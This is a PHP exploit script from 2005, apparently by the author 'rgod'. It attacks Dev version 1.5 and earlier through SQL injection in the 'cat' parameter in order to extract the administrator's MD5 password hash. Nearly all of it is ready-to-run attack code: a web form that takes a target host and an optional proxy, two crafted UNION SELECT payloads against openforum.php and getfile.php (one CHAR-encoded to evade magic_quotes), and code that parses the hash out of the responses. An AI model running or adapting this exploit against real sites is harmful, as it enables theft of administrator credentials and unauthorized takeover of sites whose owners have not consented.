<?php
#  ---Dev_15_sql_xpl.php                                     9.54 
24/12/2005   #
#                                                                              
#
#     Dev <=1.5 'cat' SQL injection / admin MD5 password hash disclosure       
#
#                              coded by rgod                                   
#
#                    site: http://rgod.altervista.org                          
#
#                                                                              
#
#  -> this works regardless of magic_quotes_gpc setting                        
#
#  usage: launch from Apache, fill in requested fields, then go!               
#
#                                                                              
#
#  Sun-Tzu: "Prohibit the taking of omens, and do away with  superstitious     
#
#  doubts. Then, until death itself comes, no calamity need be feared."        
#

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout", 5);
ob_implicit_flush (1);

echo'<html><head><title>********* Dev <=1.5 \'cat\' SQL injection 
**************
</title><meta http-equiv="Content-Type" content="text/html; 
charset=iso-8859-1">
<style type="text/css"> body {background-color:#111111;   
SCROLLBAR-ARROW-COLOR:
#ffffff; SCROLLBAR-BASE-COLOR: black; CURSOR: crosshair; color:  #1CB081; 
}  img
{background-color:   #FFFFFF   !important}  input  {background-color:    
#303030
!important} option {  background-color:   #303030   !important}         
textarea
{background-color: #303030 !important} input {color: #1CB081 !important}  
option
{color: #1CB081 !important} textarea {color: #1CB081 !important}        
checkbox
{background-color: #303030 !important} select {font-weight: normal;       
color:
#1CB081;  background-color:  #303030;}  body  {font-size:  8pt       
!important;
background-color:   #111111;   body * {font-size: 8pt !important} h1 
{font-size:
0.8em !important}   h2   {font-size:   0.8em    !important} h3 {font-size: 
0.8em
!important} h4,h5,h6    {font-size: 0.8em !important}  h1 font {font-size: 
0.8em
!important}     h2 font {font-size: 0.8em !important}h3   font {font-size: 
0.8em
!important} h4 font,h5 font,h6 font {font-size: 0.8em !important} * 
{font-style:
normal !important} *{text-decoration: none !important} 
a:link,a:active,a:visited
{ text-decoration: none ; color : #99aa33; } a:hover{text-decoration: 
underline;
color : #999933; } .Stile5 {font-family: Verdana, Arial, Helvetica,  
sans-serif;
font-size: 10px; } .Stile6 {font-family: Verdana, Arial, Helvetica,  
sans-serif;
font-weight:bold; font-style: italic;}--></style></head><body><p 
class="Stile6">
********* Dev <=1.5 \'cat\'  SQL injection **************</p><p 
class="Stile6">a
script  by  rgod  at        <a 
href="http://rgod.altervista.org"target="_blank">
http://rgod.altervista.org</a></p><table width="84%"><tr><td width="43%">  
<form
name="form1" method="post"  
action="'.strip_tags($SERVER[PHP_SELF]).'"><p><input
type="text"  name="host"> <span class="Stile5">* hostname  
(ex:www.sitename.com)
</span></p> <p><input type="text" name="path">  <span class="Stile5">* 
path (ex:
/dev/  or  just  / ) </span> </p> <p> <input type="text" name="prefix">    
<span
class="Stile5">Specify a table prefix (default: no table prefix) </span> 
</p><p>
<input type="text" name="port"><span class="Stile5">specify a port other 
than 80
default  value )</span> </p> <p> <input  type="text"  name="proxy">        
<span
class="Stile5">send  exploit through an  HTTP proxy (ip:port)  </span> 
</p>  <p>
<input type="submit" name="Submit" value="go!"></p></form> </td>   
</tr></table>
</body></html>';

function show($headeri)
{
$ii=0;
$ji=0;
$ki=0;
$ci=0;
echo '<table border="0"><tr>';
while ($ii <= strlen($headeri)-1)
{
$datai=dechex(ord($headeri[$ii]));
if ($ji==16) {
             $ji=0;
             $ci++;
             echo "<td>&nbsp;&nbsp;</td>";
             for ($li=0; $li<=15; $li++)
                      { echo "<td>".$headeri[$li+$ki]."</td>";
                            }
            $ki=$ki+16;
            echo "</tr><tr>";
            }
if (strlen($datai)==1) {echo "<td>0".$datai."</td>";} else
{echo "<td>".$datai."</td> ";}
$ii++;
$ji++;
}
for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++)
                      { echo "<td>&nbsp&nbsp</td>";
                       }

for ($li=$ci*16; $li<=strlen($headeri); $li++)
                      { echo "<td>".$headeri[$li]."</td>";
                            }
echo "</tr></table>";
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';

function sendpacket() //if you have sockets module loaded, 2x speed! if 
not,load
                              //next function to send packets
{
  global $proxy, $host, $port, $packet, $html, $proxy_regex;
  $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
  if ($socket < 0) {
                   echo "socket_create() failed: reason: " . 
socket_strerror($socket) . "<br>";
                   }
              else
                  {   $c = preg_match($proxy_regex,$proxy);
              if (!$c) {echo 'Not a valid prozy...';
                        die;
                       }
                    echo "OK.<br>";
                    echo "Attempting to connect to ".$host." on port 
".$port."...<br>";
                    if ($proxy=='')
                   {
                     $result = socket_connect($socket, $host, $port);
                   }
                   else
                   {

                   $parts =explode(':',$proxy);
                   echo 'Connecting to '.$parts[0].':'.$parts[1].' 
proxy...<br>';
                   $result = socket_connect($socket, $parts[0],$parts[1]);
                   }
                   if ($result < 0) {
                                     echo "socket_connect() 
failed.\r\nReason: (".$result.") " . socket_strerror($result) . 
"<br><br>";
                                    }
                               else
                                    {
                                     echo "OK.<br><br>";
                                     $html= '';
                                     socket_write($socket, $packet, 
strlen($packet));
                                     echo "Reading response:<br>";
                                     while ($out= socket_read($socket, 
2048)) {$html.=$out;}
                                     echo nl2br(htmlentities($html));
                                     echo "Closing socket...";
                                     socket_close($socket);

                                    }
                  }
}
function sendpacketii($packet)
{
global $proxy, $host, $port, $html, $proxy_regex;
if ($proxy=='')
      {$ock=fsockopen(gethostbyname($host),$port);
       if (!$ock) { echo 'No response from '.htmlentities($host);
                        die; }
      }
             else
           {
           $c = preg_match($proxy_regex,$proxy);
              if (!$c) {echo 'Not a valid prozy...';
                        die;
                       }
           $parts=explode(':',$proxy);
            echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
            $ock=fsockopen($parts[0],$parts[1]);
            if (!$ock) { echo 'No response from proxy...';
                        die;
                       }
           }
fputs($ock,$packet);
if ($proxy=='')
  {

    $html='';
    while (!feof($ock))
      {
        $html.=fgets($ock);
      }
  }
else
  {
    $html='';
    while ((!feof($ock)) or 
(!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html)))
    {
      $html.=fread($ock,1);
    }
  }
fclose($ock);
echo nl2br(htmlentities($html));
}

function is_hash($hash)
{
 if (ereg("^[a-z0-9]{32}",trim($hash))) {return true;}
 else {return false;}
}

$host=$_POST[host];$path=$_POST[path];
$port=$_POST[port];$prefix=$_POST[prefix];
$proxy=$_POST[proxy];

if (($host<>'') and ($path<>''))
{
  $port=intval(trim($port));
  if ($port=='') {$port=80;}
  if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... 
check the path!'; die;}
  if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
  $host=str_replace("\r\n","",$host);
  $path=str_replace("\r\n","",$path);

  #STEP 1 -> vulnerability in openforum.php (array of chars is 
'admin_password' string encoded'
  #to bypass magic quotes
  $SQL="-1 UNION SELECT value,value,value from ".$prefix."variables1 where 
name=CHAR(97,100";
  $SQL.=",109,105,110,95,112,97,115,115,119,111,114,100)";
  $SQL=urlencode($SQL);
  $packet="GET ".$p."index.php?session=0&action=openforum&cat=".$SQL." 
HTTP/1.1\r\n";
  $packet.="User-Agent: Aplix_SANYO_browser/1.x (Japanese)\r\n";
  $packet.="Host: ".$host."\r\n";
  $packet.="Connection: Close\r\n\r\n";
  show($packet);
  sendpacketii($packet);
  $temp=explode('>Board theme: "',$html);
  $temp2=explode('"',$temp[1]);
  $HASH=$temp2[0];
  if (is_hash($HASH))
   {echo "HASH ->".htmlentities($HASH)."<BR>";die("Exploit 
Succeeded...");}
  else
   {echo "Step 1 failed... trying step 2...<br>";}

  #STEP 2 -> if STEP 1 failed, vulnerability in getfile.php... this works 
with magic_quotes off
  $SQL="'UNION SELECT value,value FROM ".$prefix."variables1 WHERE 
name='admin_password'/*";
  $SQL=urlencode($SQL);
  $packet="GET ".$p."getfile.php?cat=".$SQL." HTTP/1.1\r\n";
  $packet.="User-Agent: Python-urllib/2.0a1, maybe ;)\r\n";
  $packet.="Accept: text/plain\r\n";
  $packet.="Host: ".$host."\r\n";
  $packet.="Connection: Close\r\n\r\n";
  show($packet);
  sendpacketii($packet);
  $temp=explode('Content-Type: ',$html);
  $temp2=explode(chr(0x0d),$temp[1]);
  $HASH=$temp2[0];
  if (is_hash($HASH))
   {echo "HASH ->".htmlentities($HASH)."<BR>Exploit Succeeded...";}
  else
   {echo "Exploit failed...";}
}
?>

